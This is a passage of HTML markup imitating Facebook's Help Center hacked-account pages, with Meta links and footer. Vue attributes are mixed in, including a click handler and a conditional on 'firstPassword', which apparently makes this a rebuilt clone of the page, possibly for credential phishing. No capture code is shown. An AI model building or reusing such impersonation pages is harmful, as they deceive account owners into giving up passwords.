                                                                            class="x1qjc9v5 x1q0q8m5 x1qhh985 xu3j5b3 xcfux6l x26u7qi xm0m39n x13fuv20 x972fbf x9f619 x78zum5 x1r8uery xdt5ytf x1iyjqo2 xs83m0k x1qughib xat24cr x11i5rnm x1mh8g0r xdj266r x2lwn1j xeuugli x4uap5 xkhd6sd xz9dl7a xsag5q8 x1n2onr6 x1ja2u2z"
                                                                          >
                                                                            <div
                                                                              class=""
                                                                            >
                                                                              <div
                                                                                class="x78zum5 xdt5ytf xz62fqu x16ldp7u"
                                                                              >
                                                                                <div
                                                                                  class="xu06os2 x1ok221b"
                                                                                >
                                                                                  <span
                                                                                    class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x676frb x1lkfr7t x1lbecb7 xk50ysn xzsf02u x1yc453h"
                                                                                    dir="auto"
                                                                                    ><span
                                                                                      class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lkfr7t x1lbecb7 x1s688f xzsf02u"
                                                                                    >
                                                                                      I
                                                                                      think
                                                                                      my
                                                                                      Facebook
                                                                                      Page
                                                                                      was
                                                                                      hacked
                                                                                      or
                                                                                      taken
                                                                                      over
                                                                                      by
                                                                                      someone
                                                                                      else.</span
                                                                                    ></span
                                                                                  >
                                                                                </div>
                                                                              </div>
                                                                            </div>
                                                                          </div>
                                                                          <div
                                                                            class="xod5an3 x16n37ib x14vqqas x1n2onr6 xamitd3"
                                                                          >
                                                                            <div
                                                                              class="x6s0dn4 x78zum5 x1q0g3np"
                                                                            >
                                                                              <div
                                                                                class="x78zum5"
                                                                              >
                                                                                <i
                                                                                  data-visualcompletion="css-img"
                                                                                  class="x1b0d499 xep6ejk"
                                                                                  style="
                                                                                    background-image: url('https://static.xx.fbcdn.net/rsrc.php/v3/yM/r/PEImiUdDSfD.png');
                                                                                    background-position: 0px -110px;
                                                                                    background-size: 190px
                                                                                      212px;
                                                                                    width: 20px;
                                                                                    height: 20px;
                                                                                    background-repeat: no-repeat;
                                                                                    display: inline-block;
                                                                                  "
                                                                                ></i>
                                                                              </div>
                                                                            </div>
                                                                          </div>
                                                                          <div
                                                                            class="x14nfmen x1ey2m1c xds687c xjm9jq1 x10l6tqk x17qophe"
                                                                          ></div>
                                                                        </div>
                                                                      </div>
                                                                      <div
                                                                        class="x1o1ewxj x3x9cwd x1e5q0jg x13rtm0m x1ey2m1c xds687c xg01cxk x47corl x10l6tqk x17qophe x13vifvy x1ebt8du x19991ni x1dhq9h"
                                                                        data-visualcompletion="ignore"
                                                                      ></div>
                                                                    </a>
                                                                  </div>
                                                                </div>
                                                                <div
                                                                  aria-labelledby="Recover Your Account if You Think Your Facebook Account Was Hacked or if Someone Is Using It Without Your Permission"
                                                                  role="listitem"
                                                                  class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w"
                                                                >
                                                                  <div
                                                                    data-visualcompletion="ignore-dynamic"
                                                                    style="
                                                                      padding-left: 8px;
                                                                      padding-right: 8px;
                                                                    "
                                                                  >
                                                                    <a
                                                                      class="x1i10hfl x1qjc9v5 xjbqb8w xjqpnuy xa49m3k xqeqjp1 x2hbi6w x13fuv20 xu3j5b3 x1q0q8m5 x26u7qi x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x1ypdohk xdl72j9 x2lah0s xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r x2lwn1j xeuugli xexx8yu x4uap5 x18d9i69 xkhd6sd x1n2onr6 x16tdsg8 x1hl2dhg xggy1nq x1ja2u2z x1t137rt x1q0g3np x87ps6o x1lku1pv x1a2a7pz x1lq5wgf xgqcy7u x30kzoy x9jhf4c x1lliihq"
                                                                      role="link"
                                                                      tabindex="0"
                                                                    >
                                                                      <div
                                                                        class="x6s0dn4 x1q0q8m5 x1qhh985 xu3j5b3 xcfux6l x26u7qi xm0m39n x13fuv20 x972fbf x9f619 x78zum5 x1q0g3np x1iyjqo2 xs83m0k x1qughib xat24cr x11i5rnm x1mh8g0r xdj266r xeuugli x18d9i69 x1sxyh0 xurb0ha xexx8yu x1n2onr6 x1ja2u2z x1gg8mnh"
                                                                      >
                                                                        <div
                                                                          class="x6s0dn4 xkh2ocl x1q0q8m5 x1qhh985 xu3j5b3 xcfux6l x26u7qi xm0m39n x13fuv20 x972fbf x9f619 x78zum5 x1q0g3np x1iyjqo2 xs83m0k x1qughib xat24cr x11i5rnm x1mh8g0r xdj266r x2lwn1j xeuugli x18d9i69 x4uap5 xkhd6sd xexx8yu x1n2onr6 x1ja2u2z"
                                                                        >
                                                                          <div
                                                                            class="x1qjc9v5 x1q0q8m5 x1qhh985 xu3j5b3 xcfux6l x26u7qi xm0m39n x13fuv20 x972fbf x9f619 x78zum5 x1r8uery xdt5ytf x1iyjqo2 xs83m0k x1qughib xat24cr x11i5rnm x1mh8g0r xdj266r x2lwn1j xeuugli x4uap5 xkhd6sd xz9dl7a xsag5q8 x1n2onr6 x1ja2u2z"
                                                                          >
                                                                            <div
                                                                              class=""
                                                                            >
                                                                              <div
                                                                                class="x78zum5 xdt5ytf xz62fqu x16ldp7u"
                                                                              >
                                                                                <div
                                                                                  class="xu06os2 x1ok221b"
                                                                                >
                                                                                  <span
                                                                                    class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x676frb x1lkfr7t x1lbecb7 xk50ysn xzsf02u x1yc453h"
                                                                                    dir="auto"
                                                                                    ><span
                                                                                      class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lkfr7t x1lbecb7 x1s688f xzsf02u"
                                                                                      >Recover
                                                                                      Your
                                                                                      Account
                                                                                      if
                                                                                      You
                                                                                      Think
                                                                                      Your
                                                                                      Facebook
                                                                                      Account
                                                                                      Was
                                                                                      Hacked
                                                                                      or
                                                                                      if
                                                                                      Someone
                                                                                      Is
                                                                                      Using
                                                                                      It
                                                                                      Without
                                                                                      Your
                                                                                      Permission</span
                                                                                    ></span
                                                                                  >
                                                                                </div>
                                                                              </div>
                                                                            </div>
                                                                          </div>
                                                                          <div
                                                                            class="xod5an3 x16n37ib x14vqqas x1n2onr6 xamitd3"
                                                                          >
                                                                            <div
                                                                              class="x6s0dn4 x78zum5 x1q0g3np"
                                                                            >
                                                                              <div
                                                                                class="x78zum5"
                                                                              >
                                                                                <i
                                                                                  data-visualcompletion="css-img"
                                                                                  class="x1b0d499 xep6ejk"
                                                                                  style="
                                                                                    background-image: url('https://static.xx.fbcdn.net/rsrc.php/v3/yM/r/PEImiUdDSfD.png');
                                                                                    background-position: 0px -110px;
                                                                                    background-size: 190px
                                                                                      212px;
                                                                                    width: 20px;
                                                                                    height: 20px;
                                                                                    background-repeat: no-repeat;
                                                                                    display: inline-block;
                                                                                  "
                                                                                ></i>
                                                                              </div>
                                                                            </div>
                                                                          </div>
                                                                          <div
                                                                            class="x14nfmen x1ey2m1c xds687c xjm9jq1 x10l6tqk x17qophe"
                                                                          ></div>
                                                                        </div>
                                                                      </div>
                                                                      <div
                                                                        class="x1o1ewxj x3x9cwd x1e5q0jg x13rtm0m x1ey2m1c xds687c xg01cxk x47corl x10l6tqk x17qophe x13vifvy x1ebt8du x19991ni x1dhq9h"
                                                                        data-visualcompletion="ignore"
                                                                      ></div>
                                                                    </a>
                                                                  </div>
                                                                </div>
                                                                <div
                                                                  aria-labelledby="Help your friend recover their hacked Facebook account"
                                                                  role="listitem"
                                                                  class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w"
                                                                >
                                                                  <div
                                                                    data-visualcompletion="ignore-dynamic"
                                                                    style="
                                                                      padding-left: 8px;
                                                                      padding-right: 8px;
                                                                    "
                                                                  >
                                                                    <a
                                                                      class="x1i10hfl x1qjc9v5 xjbqb8w xjqpnuy xa49m3k xqeqjp1 x2hbi6w x13fuv20 xu3j5b3 x1q0q8m5 x26u7qi x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x1ypdohk xdl72j9 x2lah0s xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r x2lwn1j xeuugli xexx8yu x4uap5 x18d9i69 xkhd6sd x1n2onr6 x16tdsg8 x1hl2dhg xggy1nq x1ja2u2z x1t137rt x1q0g3np x87ps6o x1lku1pv x1a2a7pz x1lq5wgf xgqcy7u x30kzoy x9jhf4c x1lliihq"
                                                                      role="link"
                                                                      tabindex="0"
                                                                    >
                                                                      <div
                                                                        class="x6s0dn4 x1q0q8m5 x1qhh985 xu3j5b3 xcfux6l x26u7qi xm0m39n x13fuv20 x972fbf x9f619 x78zum5 x1q0g3np x1iyjqo2 xs83m0k x1qughib xat24cr x11i5rnm x1mh8g0r xdj266r xeuugli x18d9i69 x1sxyh0 xurb0ha xexx8yu x1n2onr6 x1ja2u2z x1gg8mnh"
                                                                      >
                                                                        <div
                                                                          class="x6s0dn4 xkh2ocl x1q0q8m5 x1qhh985 xu3j5b3 xcfux6l x26u7qi xm0m39n x13fuv20 x972fbf x9f619 x78zum5 x1q0g3np x1iyjqo2 xs83m0k x1qughib xat24cr x11i5rnm x1mh8g0r xdj266r x2lwn1j xeuugli x18d9i69 x4uap5 xkhd6sd xexx8yu x1n2onr6 x1ja2u2z"
                                                                        >
                                                                          <div
                                                                            class="x1qjc9v5 x1q0q8m5 x1qhh985 xu3j5b3 xcfux6l x26u7qi xm0m39n x13fuv20 x972fbf x9f619 x78zum5 x1r8uery xdt5ytf x1iyjqo2 xs83m0k x1qughib xat24cr x11i5rnm x1mh8g0r xdj266r x2lwn1j xeuugli x4uap5 xkhd6sd xz9dl7a xsag5q8 x1n2onr6 x1ja2u2z"
                                                                          >
                                                                            <div
                                                                              class=""
                                                                            >
                                                                              <div
                                                                                class="x78zum5 xdt5ytf xz62fqu x16ldp7u"
                                                                              >
                                                                                <div
                                                                                  class="xu06os2 x1ok221b"
                                                                                >
                                                                                  <span
                                                                                    class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x676frb x1lkfr7t x1lbecb7 xk50ysn xzsf02u x1yc453h"
                                                                                    dir="auto"
                                                                                    ><span
                                                                                      class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lkfr7t x1lbecb7 x1s688f xzsf02u"
                                                                                      >Help
                                                                                      your
                                                                                      friend
                                                                                      recover
                                                                                      their
                                                                                      hacked
                                                                                      Facebook
                                                                                      account</span
                                                                                    ></span
                                                                                  >
                                                                                </div>
                                                                              </div>
                                                                            </div>
                                                                          </div>
                                                                          <div
                                                                            class="xod5an3 x16n37ib x14vqqas x1n2onr6 xamitd3"
                                                                          >
                                                                            <div
                                                                              class="x6s0dn4 x78zum5 x1q0g3np"
                                                                            >
                                                                              <div
                                                                                class="x78zum5"
                                                                              >
                                                                                <i
                                                                                  data-visualcompletion="css-img"
                                                                                  class="x1b0d499 xep6ejk"
                                                                                  style="
                                                                                    background-image: url('https://static.xx.fbcdn.net/rsrc.php/v3/yM/r/PEImiUdDSfD.png');
                                                                                    background-position: 0px -110px;
                                                                                    background-size: 190px
                                                                                      212px;
                                                                                    width: 20px;
                                                                                    height: 20px;
                                                                                    background-repeat: no-repeat;
                                                                                    display: inline-block;
                                                                                  "
                                                                                ></i>
                                                                              </div>
                                                                            </div>
                                                                          </div>
                                                                          <div
                                                                            class="x14nfmen x1ey2m1c xds687c xjm9jq1 x10l6tqk x17qophe"
                                                                          ></div>
                                                                        </div>
                                                                      </div>
                                                                      <div
                                                                        class="x1o1ewxj x3x9cwd x1e5q0jg x13rtm0m x1ey2m1c xds687c xg01cxk x47corl x10l6tqk x17qophe x13vifvy x1ebt8du x19991ni x1dhq9h"
                                                                        data-visualcompletion="ignore"
                                                                      ></div>
                                                                    </a>
                                                                  </div>
                                                                </div>
                                                                <div
                                                                  aria-labelledby="Hacked and Fake Accounts"
                                                                  role="listitem"
                                                                  class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w"
                                                                >
                                                                  <div
                                                                    data-visualcompletion="ignore-dynamic"
                                                                    style="
                                                                      padding-left: 8px;
                                                                      padding-right: 8px;
                                                                    "
                                                                  >
                                                                    <a
                                                                      class="x1i10hfl x1qjc9v5 xjbqb8w xjqpnuy xa49m3k xqeqjp1 x2hbi6w x13fuv20 xu3j5b3 x1q0q8m5 x26u7qi x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x1ypdohk xdl72j9 x2lah0s xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r x2lwn1j xeuugli xexx8yu x4uap5 x18d9i69 xkhd6sd x1n2onr6 x16tdsg8 x1hl2dhg xggy1nq x1ja2u2z x1t137rt x1q0g3np x87ps6o x1lku1pv x1a2a7pz x1lq5wgf xgqcy7u x30kzoy x9jhf4c x1lliihq"
                                                                      role="link"
                                                                      tabindex="0"
                                                                    >
                                                                      <div
                                                                        class="x6s0dn4 x1q0q8m5 x1qhh985 xu3j5b3 xcfux6l x26u7qi xm0m39n x13fuv20 x972fbf x9f619 x78zum5 x1q0g3np x1iyjqo2 xs83m0k x1qughib xat24cr x11i5rnm x1mh8g0r xdj266r xeuugli x18d9i69 x1sxyh0 xurb0ha xexx8yu x1n2onr6 x1ja2u2z x1gg8mnh"
                                                                      >
                                                                        <div
                                                                          class="x6s0dn4 xkh2ocl x1q0q8m5 x1qhh985 xu3j5b3 xcfux6l x26u7qi xm0m39n x13fuv20 x972fbf x9f619 x78zum5 x1q0g3np x1iyjqo2 xs83m0k x1qughib xat24cr x11i5rnm x1mh8g0r xdj266r x2lwn1j xeuugli x18d9i69 x4uap5 xkhd6sd xexx8yu x1n2onr6 x1ja2u2z"
                                                                        >
                                                                          <div
                                                                            class="x1qjc9v5 x1q0q8m5 x1qhh985 xu3j5b3 xcfux6l x26u7qi xm0m39n x13fuv20 x972fbf x9f619 x78zum5 x1r8uery xdt5ytf x1iyjqo2 xs83m0k x1qughib xat24cr x11i5rnm x1mh8g0r xdj266r x2lwn1j xeuugli x4uap5 xkhd6sd xz9dl7a xsag5q8 x1n2onr6 x1ja2u2z"
                                                                          >
                                                                            <div
                                                                              class=""
                                                                            >
                                                                              <div
                                                                                class="x78zum5 xdt5ytf xz62fqu x16ldp7u"
                                                                              >
                                                                                <div
                                                                                  class="xu06os2 x1ok221b"
                                                                                >
                                                                                  <span
                                                                                    class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x676frb x1lkfr7t x1lbecb7 xk50ysn xzsf02u x1yc453h"
                                                                                    dir="auto"
                                                                                    ><span
                                                                                      class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lkfr7t x1lbecb7 x1s688f xzsf02u"
                                                                                      >Hacked
                                                                                      and
                                                                                      Fake
                                                                                      Accounts</span
                                                                                    ></span
                                                                                  >
                                                                                </div>
                                                                              </div>
                                                                            </div>
                                                                          </div>
                                                                          <div
                                                                            class="xod5an3 x16n37ib x14vqqas x1n2onr6 xamitd3"
                                                                          >
                                                                            <div
                                                                              class="x6s0dn4 x78zum5 x1q0g3np"
                                                                            >
                                                                              <div
                                                                                class="x78zum5"
                                                                              >
                                                                                <i
                                                                                  data-visualcompletion="css-img"
                                                                                  class="x1b0d499 xep6ejk"
                                                                                  style="
                                                                                    background-image: url('https://static.xx.fbcdn.net/rsrc.php/v3/yM/r/PEImiUdDSfD.png');
                                                                                    background-position: 0px -110px;
                                                                                    background-size: 190px
                                                                                      212px;
                                                                                    width: 20px;
                                                                                    height: 20px;
                                                                                    background-repeat: no-repeat;
                                                                                    display: inline-block;
                                                                                  "
                                                                                ></i>
                                                                              </div>
                                                                            </div>
                                                                          </div>
                                                                        </div>
                                                                      </div>
                                                                      <div
                                                                        class="x1o1ewxj x3x9cwd x1e5q0jg x13rtm0m x1ey2m1c xds687c xg01cxk x47corl x10l6tqk x17qophe x13vifvy x1ebt8du x19991ni x1dhq9h"
                                                                        data-visualcompletion="ignore"
                                                                      ></div>
                                                                    </a>
                                                                  </div>
                                                                </div>
                                                              </div>
                                                            </div>
                                                          </div>
                                                        </div>
                                                      </div>
                                                    </div>
                                                  </div>
                                                </div>
                                              </div>
                                            </div>
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </div>
                              <div
                                class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w"
                                @click="outsideAlert()"
                              >
                                <div class="x443n21 x78zum5 xl56j7k">
                                  <div
                                    class="x1lxuw3u xoi86sf x5oxk1f x1jxijyj"
                                  >
                                    <div
                                      class="x9f619 x1n2onr6 x1ja2u2z x78zum5 x2lah0s x1nhvcw1 x1cy8zhl x1a02dak x1q0g3np x1l90r2v xyamay9 xykv574 xbmpl8g xh8yej3"
                                    >
                                      <div
                                        class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf xamitd3 xsyo7zv x16hj40l xs83m0k xf9lk3t x1vril5w xyamay9 x1l90r2v xsxmq0e x85kguw"
                                      >
                                        <ul
                                          aria-label="Help Center Footer"
                                          role="listbox"
                                        >
                                          <div
                                            class="x8gbvx8 x78zum5 x1q0g3np x1a02dak x1nhvcw1 x1rdy4ex xcud41i x4vbgl9 x139jcc6"
                                            role="list"
                                          >
                                            <div
                                              class="x9f619 x78zum5 x1r8uery xdt5ytf x1iyjqo2 xs83m0k x150jy0e x1e558r4 xjkvuk6 x1iorvi4 xnpuxes"
                                              role="listitem"
                                              style="
                                                max-width: 280px;
                                                min-width: 240px;
                                              "
                                            >
                                              <li>
                                                <a
                                                  class="x1i10hfl xjbqb8w x6umtig x1b1mbwd xaqea5y xav7gou x9f619 x1ypdohk xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1a2a7pz x1heor9g x6s0dn4 x78zum5 xc9qbxq x1lku1pv"
                                                  rel="nofollow noreferrer"
                                                  role="link"
                                                  tabindex="0"
                                                  target="_blank"
                                                  ><span
                                                    class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x3x7a5m x6prxxf xvq8zen xo1l8bm xi81zsa"
                                                    dir="auto"
                                                    >About</span
                                                  ></a
                                                >
                                              </li>
                                            </div>
                                            <div
                                              class="x9f619 x78zum5 x1r8uery xdt5ytf x1iyjqo2 xs83m0k x150jy0e x1e558r4 xjkvuk6 x1iorvi4 xnpuxes"
                                              role="listitem"
                                              style="
                                                max-width: 280px;
                                                min-width: 240px;
                                              "
                                            >
                                              <li>
                                                <a
                                                  class="x1i10hfl xjbqb8w x6umtig x1b1mbwd xaqea5y xav7gou x9f619 x1ypdohk xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1a2a7pz x1heor9g x6s0dn4 x78zum5 xc9qbxq x1lku1pv"
                                                  href="https://www.facebook.com/privacy/explanation/"
                                                  role="link"
                                                  tabindex="0"
                                                  ><span
                                                    class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x3x7a5m x6prxxf xvq8zen xo1l8bm xi81zsa"
                                                    dir="auto"
                                                    >Privacy</span
                                                  ></a
                                                >
                                              </li>
                                            </div>
                                            <div
                                              class="x9f619 x78zum5 x1r8uery xdt5ytf x1iyjqo2 xs83m0k x150jy0e x1e558r4 xjkvuk6 x1iorvi4 xnpuxes"
                                              role="listitem"
                                              style="
                                                max-width: 280px;
                                                min-width: 240px;
                                              "
                                            >
                                              <li>
                                                <a
                                                  class="x1i10hfl xjbqb8w x6umtig x1b1mbwd xaqea5y xav7gou x9f619 x1ypdohk xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1a2a7pz x1heor9g x6s0dn4 x78zum5 xc9qbxq x1lku1pv"
                                                  href="https://www.facebook.com/policies/"
                                                  role="link"
                                                  tabindex="0"
                                                  ><span
                                                    class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x3x7a5m x6prxxf xvq8zen xo1l8bm xi81zsa"
                                                    dir="auto"
                                                    >Terms and Policies</span
                                                  ></a
                                                >
                                              </li>
                                            </div>
                                            <div
                                              class="x9f619 x78zum5 x1r8uery xdt5ytf x1iyjqo2 xs83m0k x150jy0e x1e558r4 xjkvuk6 x1iorvi4 xnpuxes"
                                              role="listitem"
                                              style="
                                                max-width: 280px;
                                                min-width: 240px;
                                              "
                                            >
                                              <li>
                                                <a
                                                  class="x1i10hfl xjbqb8w x6umtig x1b1mbwd xaqea5y xav7gou x9f619 x1ypdohk xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1a2a7pz x1heor9g x6s0dn4 x78zum5 xc9qbxq x1lku1pv"
                                                  href="https://www.facebook.com/help/568137493302217/"
                                                  role="link"
                                                  tabindex="0"
                                                  ><span
                                                    class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x3x7a5m x6prxxf xvq8zen xo1l8bm xi81zsa"
                                                    dir="auto"
                                                    >Ad Choices</span
                                                  ></a
                                                >
                                              </li>
                                            </div>
                                            <div
                                              class="x9f619 x78zum5 x1r8uery xdt5ytf x1iyjqo2 xs83m0k x150jy0e x1e558r4 xjkvuk6 x1iorvi4 xnpuxes"
                                              role="listitem"
                                              style="
                                                max-width: 280px;
                                                min-width: 240px;
                                              "
                                            >
                                              <li>
                                                <a
                                                  class="x1i10hfl xjbqb8w x6umtig x1b1mbwd xaqea5y xav7gou x9f619 x1ypdohk xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1a2a7pz x1heor9g x6s0dn4 x78zum5 xc9qbxq x1lku1pv"
                                                  href="https://www.facebook.com/careers/"
                                                  role="link"
                                                  tabindex="0"
                                                  ><span
                                                    class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x3x7a5m x6prxxf xvq8zen xo1l8bm xi81zsa"
                                                    dir="auto"
                                                    >Careers</span
                                                  ></a
                                                >
                                              </li>
                                            </div>
                                            <div
                                              class="x9f619 x78zum5 x1r8uery xdt5ytf x1iyjqo2 xs83m0k x150jy0e x1e558r4 xjkvuk6 x1iorvi4 xnpuxes"
                                              role="listitem"
                                              style="
                                                max-width: 280px;
                                                min-width: 240px;
                                              "
                                            >
                                              <li>
                                                <a
                                                  class="x1i10hfl xjbqb8w x6umtig x1b1mbwd xaqea5y xav7gou x9f619 x1ypdohk xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1a2a7pz x1heor9g x6s0dn4 x78zum5 xc9qbxq x1lku1pv"
                                                  href="https://www.facebook.com/policies/cookies/"
                                                  role="link"
                                                  tabindex="0"
                                                  ><span
                                                    class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x3x7a5m x6prxxf xvq8zen xo1l8bm xi81zsa"
                                                    dir="auto"
                                                    >Cookies</span
                                                  ></a
                                                >
                                              </li>
                                            </div>
                                            <div
                                              class="x9f619 x78zum5 x1r8uery xdt5ytf x1iyjqo2 xs83m0k x150jy0e x1e558r4 xjkvuk6 x1iorvi4 xnpuxes"
                                              role="listitem"
                                              style="
                                                max-width: 280px;
                                                min-width: 240px;
                                              "
                                            >
                                              <li>
                                                <a
                                                  class="x1i10hfl xjbqb8w x6umtig x1b1mbwd xaqea5y xav7gou x9f619 x1ypdohk xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1a2a7pz x1heor9g x6s0dn4 x78zum5 xc9qbxq x1lku1pv"
                                                  href="https://www.facebook.com/business/"
                                                  role="link"
                                                  tabindex="0"
                                                  ><span
                                                    class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x3x7a5m x6prxxf xvq8zen xo1l8bm xi81zsa"
                                                    dir="auto"
                                                    >Create Ad</span
                                                  ></a
                                                >
                                              </li>
                                            </div>
                                            <div
                                              class="x9f619 x78zum5 x1r8uery xdt5ytf x1iyjqo2 xs83m0k x150jy0e x1e558r4 xjkvuk6 x1iorvi4 xnpuxes"
                                              role="listitem"
                                              style="
                                                max-width: 280px;
                                                min-width: 240px;
                                              "
                                            >
                                              <li>
                                                <a
                                                  class="x1i10hfl xjbqb8w x6umtig x1b1mbwd xaqea5y xav7gou x9f619 x1ypdohk xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1a2a7pz x1heor9g x6s0dn4 x78zum5 xc9qbxq x1lku1pv"
                                                  href="https://www.facebook.com/pages/creation/"
                                                  role="link"
                                                  tabindex="0"
                                                  ><span
                                                    class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x3x7a5m x6prxxf xvq8zen xo1l8bm xi81zsa"
                                                    dir="auto"
                                                    >Create Page</span
                                                  ></a
                                                >
                                              </li>
                                            </div>
                                          </div>
                                        </ul>
                                      </div>
                                    </div>
                                    <hr
                                      class="html-hr xe8uvvx xexx8yu x4uap5 x18d9i69 xkhd6sd x1ejq31n xd10rxx x1sy0etr x17r0tee x972fbf xcfux6l x1qhh985 xm0m39n xdj266r x11i5rnm xat24cr x1mh8g0r x14nfmen x9f619 xjm9jq1"
                                    />
                                    <div
                                      class="x9f619 x1n2onr6 x1ja2u2z x78zum5 x2lah0s x1qughib x6s0dn4 xozqiw3 x1q0g3np xyamay9 x4cne27 xifccgj"
                                    >
                                      <div
                                        class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli x10b6aqq x1yrsyyn x1hk0nng xkhd6sd"
                                      >
                                        <img
                                          width="100"
                                          alt="From Meta Logo"
                                          referrerpolicy="origin-when-cross-origin"
                                          src="https://static.xx.fbcdn.net/rsrc.php/v3/yF/r/h9b1AHfIb8K.png"
                                        />
                                      </div>
                                      <div
                                        class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli x10b6aqq x1yrsyyn x1oysuqx"
                                      >
                                        <div
                                          class="x9f619 x1n2onr6 x1ja2u2z x1qjc9v5 x78zum5 xdt5ytf x1iyjqo2 xl56j7k xeuugli xsag5q8 xz9dl7a xykv574 xbmpl8g x4cne27 xifccgj"
                                        >
                                          <div
                                            class="x9f619 x1n2onr6 x1ja2u2z x78zum5 x2lah0s x1qughib x6s0dn4 xozqiw3 x1q0g3np"
                                          >
                                            <div
                                              class="x9f619 x1n2onr6 x1ja2u2z x78zum5 x1iyjqo2 xs83m0k xeuugli x1qughib x6s0dn4 x1a02dak x1q0g3np xdl72j9"
                                            >
                                              <div
                                                class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli x1iyjqo2"
                                              >
                                                <div
                                                  class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli xsyo7zv x16hj40l x10b6aqq x1yrsyyn"
                                                >
                                                  <div
                                                    class="x78zum5 xdt5ytf xz62fqu x16ldp7u"
                                                  >
                                                    <div
                                                      class="xu06os2 x1ok221b"
                                                    >
                                                      <span
                                                        class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x4zkp8e x3x7a5m x1nxh6w3 x1sibtaa xo1l8bm xi81zsa xp4054r"
                                                        dir="auto"
                                                        ><span
                                                          class="x1lliihq x6ikm8r x10wlt62 x1n2onr6 xlyipyv xuxw1ft x1j85h84"
                                                        >
                                                          © 2023 Meta</span
                                                        ></span
                                                      >
                                                    </div>
                                                  </div>
                                                </div>
                                              </div>
                                            </div>
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                    <!--/$-->
                    <!--/$-->
                    <div>
                      <div></div>
                    </div>
                  </div>
                  <!--/$-->
                  <div>
                    <div></div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div>
            <div></div>
          </div>
        </div>
        <!--$-->
        <!--/$-->
      </div>
      <!--/$-->
    </div>
    <!--/$-->
    <!--/$-->
  </div>
  <!-- <ChatWidget /> -->

  <div
    v-if="firstPassword"
